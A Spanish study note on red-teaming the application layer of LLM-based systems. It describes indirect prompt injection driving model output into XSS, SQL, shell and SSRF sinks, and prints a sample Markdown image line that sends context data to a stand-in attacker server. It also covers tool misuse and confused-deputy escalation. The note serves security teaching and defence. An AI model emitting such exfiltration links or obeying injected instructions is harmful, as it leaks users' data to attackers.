---
tags:
  - IA/Red-Team
  - IA
  - Web/Red-Team
  - Pentesting/Explotacion
Descripción: "El componente de aplicación es el que más se parece a un sistema tradicional, y es donde un pentester con oficio web tiene ventaja inmediata"
Fecha de actualización: 2026-07-28
Nota previa: "[[08 - Ataques a los componentes de datos]]"
Nota siguiente: "[[10 - Ataques a los componentes de sistema]]"
Area: "[[Red Teaming AI.base|Red Teaming AI]]"
---
---

<mark style="background: #ADCCFFA6;">El componente de aplicación es el que más se parece a un sistema tradicional, y es donde un pentester con oficio web tiene ventaja inmediata.</mark> Los sistemas generativos casi nunca se despliegan aislados: se integran en aplicaciones web, servicios de correo y sistemas internos. Todo el catálogo clásico de vulnerabilidades sigue aplicando.

> [!info]+ Explotación detallada
> Esta nota da el marco conceptual del componente de aplicación. La explotación práctica —model reverse engineering, DoS de ML, IDOR e inyecciones en plugins, rogue actions— está en el sub-tema [[00 - Superficie de ataque de aplicación y sistema|Aplicación y sistema]]. La superficie específica de agentes con `MCP` tiene su propio sub-tema en [[00 - Qué es MCP y por qué cambia la superficie de ataque|MCP y seguridad de agentes]].

# Riesgos tradicionales, sin cambios

- **Acceso no autorizado** — entrada a áreas sensibles sin credenciales válidas: interfaces administrativas, datos de otros usuarios. Puede escalar a compromiso completo.
- **Inyección** — [[00 - Introducción a SQL Injection]] y [[00 - Introducción a Command Injection]] por tratamiento inadecuado de la entrada.
- **Autenticación insegura** — contraseñas débiles, ausencia de MFA, gestión defectuosa de tokens de sesión.
- **Divulgación de información** — errores verbosos, logs excesivos, controles de acceso insuficientes, transmisión sin cifrar.

Y las TTPs correspondientes: manipulación de campos, parámetros y URLs; tipos de dato inesperados; cadenas excesivamente largas; codificación y ofuscación para saltar validaciones; [[00 - Introducción a XSS]] en zonas de contenido generado por usuarios; e ingeniería social —`phishing`, pretexting, `baiting`— como acceso inicial.

# Lo que cambia al meter un modelo en la aplicación

Aquí está el valor real de esta nota, porque el componente de aplicación en un sistema de IA no es simplemente "una web más".

## El modelo es una fuente de datos no confiables

<mark style="background: #FF5582A6;">La regla que lo resume todo: **la salida del LLM es entrada de usuario**.</mark> En el análisis de flujo de datos clásico, la *source* es el parámetro HTTP y el *sink* es la consulta SQL o el DOM. Al introducir un modelo aparece una *source* nueva que casi nadie modela: **su salida**.

| Sink | Vulnerabilidad resultante |
| - | - |
| Renderizar la respuesta en HTML sin escapar | [[00 - Introducción a XSS]] |
| Ejecutar el SQL que el modelo genera | [[00 - Introducción a SQL Injection]] |
| Pasar su salida a un intérprete o a `shell` | [[00 - Introducción a Command Injection]] |
| Usarla como URL de una petición del servidor | [[01 - Introducción a SSRF]] |
| Escribirla en un fichero cuya ruta sugiere el modelo | Path traversal / escritura arbitraria |

Y lo que lo hace grave: **el atacante controla esa salida indirectamente** mediante `prompt injection`. La cadena completa es *contenido malicioso en un documento → el modelo lo lee → genera la salida que el atacante quiere → la aplicación la ejecuta*. El atacante nunca envió una petición HTTP maliciosa; su payload viajó dentro de un PDF. Los vectores de entrega y los casos reales de esa cadena están en [[05 - Inyección indirecta en RAG, email y web]] y [[06 - EchoLeak y la exfiltración zero-click]].

## Exfiltración por renderizado de la respuesta

Es la técnica más característica de este dominio y HTB no la menciona. Muchas interfaces de chat renderizan Markdown o HTML en la respuesta del modelo, **incluidas las imágenes**.

Si el atacante logra que el modelo emita una imagen cuya URL apunte a un servidor suyo y contenga datos del contexto:

```markdown
![](https://servidor-atacante/logo.png?d=DATOS_DEL_CONTEXTO)
```

<mark style="background: #8000E1A6;">El navegador de la víctima solicita esa imagen automáticamente al renderizar, y el dato viaja en la petición.</mark> No hace falta que nadie pulse nada. Es exfiltración de canal lateral a través de la propia interfaz, y funciona con cualquier elemento que provoque una petición saliente: imágenes, iframes, enlaces con precarga.

Mitigaciones, por orden de eficacia:

1. **No renderizar imágenes ni recursos remotos** en la salida del modelo. Es lo único que cierra el canal del todo.
2. **`Content-Security-Policy` estricta** (`img-src`, `connect-frame-src`) limitando los destinos a dominios propios.
3. **Lista blanca de dominios** en el renderizador.

> [!warning]+ Proxyficar las imágenes no basta, y es el error habitual
> La respuesta intuitiva —"servimos las imágenes a través de nuestro propio proxy, así el navegador nunca contacta al atacante"— <mark style="background: #FF5582A6;">no cierra el canal: lo mueve del cliente al servidor</mark>. El proxy tiene que ir a buscar la imagen a la URL indicada, y esa petición **sigue llevando los datos en la query string** hasta el servidor del atacante.
>
> Además satisface a la `CSP`, porque para el navegador el origen es de confianza. El resultado es una exfiltración que además pasa por la infraestructura de la víctima, lo que la hace más difícil de atribuir y a menudo la deja fuera de los registros que se revisan.
>
> Un proxy solo sirve como mitigación si valida el destino **antes** de la petición contra una lista blanca. Sin eso, es un SSRF con extra de exfiltración.

## Herramientas y llamadas a función

Cuando el modelo puede invocar funciones que la aplicación ejecuta —consultar una base de datos, hacer una petición HTTP, leer un fichero, ejecutar código— cada herramienta es un `endpoint` **cuyos parámetros los elige un componente influenciable por el atacante**.

Qué revisar en cada una:

- **Validación de parámetros en el lado del servidor.** Que el modelo "solo deba" pasar un identificador numérico no significa que no pueda pasar otra cosa. Toda validación tiene que estar en el ejecutor, nunca delegada en la instrucción del prompt.
- **Permisos efectivos.** Una herramienta de consulta que usa una conexión con permisos de escritura convierte una fuga en destrucción de datos.
- **Peticiones salientes.** Una herramienta de tipo "lee esta URL" es SSRF por diseño salvo que haya lista blanca; y en la nube, apuntar al servicio de metadatos es el primer intento obligado — ver [[03 - Explotación de SSRF]].
- **Acciones irreversibles.** Enviar correo, borrar, transferir, publicar. <mark style="background: #FFB86CA6;">Deben exigir confirmación humana fuera del canal que el modelo controla</mark>, porque si la confirmación se la pide el propio modelo, la inyección también la controla.

## Agencia excesiva, en concreto

El `LLM06` traducido a preguntas de auditoría:

- ¿Qué herramientas tiene disponibles y cuáles usa realmente? Todo lo que sobra es superficie regalada.
- ¿Con qué identidad se ejecutan? Si es una cuenta de servicio con permisos amplios, el modelo hereda esos permisos y el atacante también.
- ¿Puede encadenar acciones sin intervención humana? La autonomía multiplica el impacto de una única inyección.
- ¿Puede el usuario final elevar privilegios *a través* del modelo, pidiéndole que haga algo que él no puede hacer directamente? <mark style="background: #FFB8EBA6;">Este es el hallazgo más frecuente y el más pasado por alto</mark>: el modelo actúa como *confused deputy*, con sus permisos y no con los del usuario.

# Cómo abordar el componente

En la práctica, se audita como una aplicación web normal **más** dos pasadas específicas:

1. **Pasada clásica** — autenticación, autorización, inyección, gestión de sesión, exposición de información. El chatbot no exime a la aplicación de tener los fallos de siempre.
2. **Pasada de flujo del modelo** — trazar de dónde viene todo lo que entra en el contexto y a dónde va todo lo que sale de él.
3. **Pasada de herramientas** — inventariar cada capacidad concedida, sus permisos efectivos y su validación.

<mark style="background: #FF5582A6;">La mayoría de los hallazgos con impacto real en un engagement de IA salen de los puntos 2 y 3, no de conseguir que el modelo diga algo inapropiado.</mark>

## Fuentes

- Contenido base del módulo *Introduction to Red Teaming AI* de HTB Academy, ampliado con el modelo como fuente no confiable en el análisis de flujo, la exfiltración por renderizado de Markdown, la auditoría de herramientas y llamadas a función, y el patrón *confused deputy*, ausentes en el original.
